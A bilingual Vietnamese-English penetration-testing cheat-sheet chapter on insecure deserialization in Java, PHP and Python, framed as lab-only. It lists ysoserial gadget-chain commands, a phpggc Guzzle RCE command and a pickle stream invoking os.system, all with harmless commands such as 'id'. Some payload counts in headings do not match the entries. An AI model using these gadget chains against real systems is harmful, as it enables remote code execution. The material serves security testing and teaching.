# 10. Deserialization

> [!CAUTION]
> Chỉ dùng trong lab local hoặc hệ thống có ủy quyền rõ ràng. Payload có risk `destructive`, `dos` hoặc `oob` phải chạy trong fixture cô lập, có giới hạn tài nguyên và không có outbound network.

> **Phạm vi kiểm chứng:** Nội dung và payload vẫn ở mức technical review. `static-verified` chỉ xác nhận annotation và kiểm tra tĩnh trong đúng context/version đã ghi; không phải lab evidence và không cho phép sử dụng ngoài phạm vi được ủy quyền.

Deserialization xảy ra khi ứng dụng chuyển đổi dữ liệu đã được tuần tự hóa (Serialized Data) ngược lại thành đối tượng trong bộ nhớ mà không kiểm duyệt lớp đối tượng, dẫn đến thực thi mã tùy ý (RCE).

### 10.1. Java (ysoserial & Serialization Signatures)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Dữ liệu truyền đi bắt đầu bằng tiền tố Base64 `rO0AB` hoặc chuỗi byte hex `ac ed 00 05`.
    *   *English*: Data streams display standard Java serialization magic bytes (hex `ac ed 00 05` or base64 `rO0AB`).
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi tệp payload URLDNS để kiểm tra xem máy chủ có phân giải DNS trỏ về máy chủ OOB của bạn không.
    *   *English*: Submit a URLDNS serialized object and check for outgoing DNS queries.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-10-001 -->
<!-- context: OpenJDK 8u392, PHP 8.2 and Python 3.12 disposable deserialization fixtures with pinned local gadget dependencies and no outbound network; case: 10.1. Java (ysoserial & Serialization Signatures) -->
<!-- prerequisites: install only the pinned local gadget dependencies, replace side effects with a marker file/stdout value, cap the process and discard it after deserialization -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the pinned vulnerable Java gadget fixture writes one local marker after deserialization; the allowlisted/non-native format rejects the stream -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-17 -->
```
    # 1. Java Serialization Magic Bytes in hex representation (Hex bytes: 0xAC 0xED 0x00 0x05)
    \xac\xed\x00\x05

    # 2. Base64 representation of Java Serialization Magic Bytes
    rO0AB

    # 3. URLDNS is allowed only with callback.lab.test mapped to a local mock
    # java -jar ysoserial.jar URLDNS http://callback.lab.test/probe-42

    # 4. CommonsCollections1 Gadget: RCE via Apache Commons Collections 3.1 (Requires Java version < 8u75. For JRE >= 8u75, use CommonsCollections5 or CommonsCollections6 instead)
    # java -jar ysoserial.jar CommonsCollections1 "calc.exe" | base64

    # 5. CommonsCollections5 Gadget: RCE utilizing BadAttributeValueExpException
    # java -jar ysoserial.jar CommonsCollections5 "id"

    # 6. CommonsCollections6 Gadget: Bypasses newer JRE protections by utilizing HashSet object chain
    # java -jar ysoserial.jar CommonsCollections6 "whoami"

    # 7. CommonsBeanutils1 Gadget: RCE targeting Commons Beanutils 1.9.2
    # java -jar ysoserial.jar CommonsBeanutils1 "id"

    # 8. ROME Gadget: RCE via ROME feed processing library
    # java -jar ysoserial.jar ROME "whoami"

    # 9. Jackson Gadget: RCE targeting Jackson databind deserializer
    # java -jar ysoserial.jar Jackson "id"

    # 10. AspectJWeaver Gadget: Triggers file creation/write on host system
    # java -jar ysoserial.jar AspectJWeaver "arbitrary_write_payload"
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng ysoserial để tạo payload Java Serialization RCE tự động.
    *   *English*: Run ysoserial tool to generate custom serialized payload files.
<!-- payload-id: CHEAT-10-002 -->
<!-- context: OpenJDK 8u392, PHP 8.2 and Python 3.12 disposable deserialization fixtures with pinned local gadget dependencies and no outbound network; case: 10.1. Java (ysoserial & Serialization Signatures) -->
<!-- prerequisites: install only the pinned local gadget dependencies, replace side effects with a marker file/stdout value, cap the process and discard it after deserialization -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the pinned vulnerable Java gadget fixture writes one local marker after deserialization; the allowlisted/non-native format rejects the stream -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    java -jar ysoserial.jar CommonsCollections6 "id" > cc6.ser
    ```


---

### 10.2. PHP Object Injection
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Tham số truyền đi chứa chuỗi định dạng đối tượng của PHP (như `O:4:"User":2:{...}`).
    *   *English*: Parameter format exhibits standard PHP serialization strings (e.g. `O:4:"User":...`).
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thay đổi giá trị hoặc kiểu dữ liệu trong chuỗi serialize để kích hoạt các hàm ma thuật (`__wakeup`, `__destruct`).
    *   *English*: Tamper with class properties or values to trigger vulnerability logic inside magic methods.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-10-003 -->
<!-- context: OpenJDK 8u392, PHP 8.2 and Python 3.12 disposable deserialization fixtures with pinned local gadget dependencies and no outbound network; case: 10.2. PHP Object Injection -->
<!-- prerequisites: install only the pinned local gadget dependencies, replace side effects with a marker file/stdout value, cap the process and discard it after deserialization -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable PHP fixture invokes only the pinned local gadget marker; the fixed endpoint accepts schema-validated JSON and never calls unserialize on actor data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-17 -->
```
    # 1. Serialized User object for a fake local fixture
    O:4:"User":1:{s:8:"username";s:5:"admin";}

    # 2. Safe scalar array used to verify parser framing
    a:2:{i:0;s:5:"alpha";i:1;s:4:"beta";}
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng các công cụ fuzzing hoặc script tự viết để thay đổi chuỗi PHP serialize tự động.
    *   *English*: Deploy custom python scripts to dynamically generate corrupted serialized PHP classes.
<!-- payload-id: CHEAT-10-004 -->
<!-- context: OpenJDK 8u392, PHP 8.2 and Python 3.12 disposable deserialization fixtures with pinned local gadget dependencies and no outbound network; case: 10.2. PHP Object Injection -->
<!-- prerequisites: install only the pinned local gadget dependencies, replace side effects with a marker file/stdout value, cap the process and discard it after deserialization -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable PHP fixture invokes only the pinned local gadget marker; the fixed endpoint accepts schema-validated JSON and never calls unserialize on actor data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Use phpggc to generate a serialized object targeting Guzzle RCE gadget chain
    phpggc Guzzle/RCE1 system "id"
    # Use a local PHP CLI one-liner to generate a custom serialized payload
    php -r 'class User { public $username = "admin"; } echo serialize(new User());'
    ```


---

### 10.3. Python Pickle
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Dữ liệu lưu trong Cookie hoặc tham số chứa chuỗi Base64 bắt đầu bằng ký tự `gASV`.
    *   *English*: Base64 parameter string decodes to Python Pickle opcode bytes (starts with `gASV`).
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Trong fixture disposable, dùng stream protocol-0 đã cố định chỉ in marker; đối chứng an toàn phải từ chối pickle do actor cung cấp và dùng schema JSON.
    *   *English*: In the disposable fixture, use the fixed protocol-0 stream that only prints a marker; the safe control rejects actor-supplied pickle and uses a JSON schema.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-10-005 -->
<!-- context: OpenJDK 8u392, PHP 8.2 and Python 3.12 disposable deserialization fixtures with pinned local gadget dependencies and no outbound network; case: 10.3. Python Pickle -->
<!-- prerequisites: install only the pinned local gadget dependencies, replace side effects with a marker file/stdout value, cap the process and discard it after deserialization -->
<!-- encoding: ASCII representation of a protocol-0 pickle stream; literal backslash-n sequences denote opcode line terminators and must be converted to bytes by the isolated harness -->
<!-- expected-result: the disposable Python fixture emits only the SECHUB marker for the explicit unsafe-load case; the fixed JSON path treats the bytes as data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-17 -->
```text
    # Protocol-0 probe invoking a harmless stdout marker in a disposable fixture
    cos\nsystem\n(S'printf SECHUB_PICKLE_PROBE'\ntR.
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng script python tự viết để sinh payload Pickle nhanh chóng.
    *   *English*: Compile dynamic python pickle payload builders.
<!-- payload-id: CHEAT-10-006 -->
<!-- context: OpenJDK 8u392, PHP 8.2 and Python 3.12 disposable deserialization fixtures with pinned local gadget dependencies and no outbound network; case: 10.3. Python Pickle -->
<!-- prerequisites: install only the pinned local gadget dependencies, replace side effects with a marker file/stdout value, cap the process and discard it after deserialization -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the disposable Python fixture emits only the SECHUB marker for the explicit unsafe-load case; the fixed JSON path treats the bytes as data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python3 -c 'import base64,pickle; print(base64.b64encode(pickle.dumps({"probe":"SECHUB"})).decode())'
    ```

---

## Tài liệu tham khảo

- **[S1]** OWASP Deserialization Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html — bản hiện hành; truy cập: 2026-07-18.
- **[S2]** Python 3 Documentation — pickle warning and data stream format. https://docs.python.org/3/library/pickle.html — bản hiện hành; truy cập: 2026-07-18.
- **[S3]** PortSwigger Web Security Academy — Insecure deserialization. https://portswigger.net/web-security/deserialization — bản hiện hành; truy cập: 2026-07-18.
